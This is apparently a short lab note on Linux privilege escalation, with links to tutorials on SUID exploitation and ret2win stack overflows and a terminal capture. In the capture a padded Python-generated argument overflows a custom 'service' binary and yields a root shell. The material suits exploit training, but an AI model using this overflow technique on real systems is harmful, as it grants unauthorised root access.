

more on here : https://0toroot.com/learn/linux-privesc/custom-suid-exploitation

https://hacktricks.wiki/en/binary-exploitation/stack-overflow/ret2win/index.html


user@794cdd4e22e34c1c8f4cd1581f197c0f-2377118072:~$ ./service $(python3 -c 'print("A" * 79 + "22222222")')
Buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA22222222
2: 8
A: 79
root@794cdd4e22e34c1c8f4cd1581f197c0f-2377118072:~# 
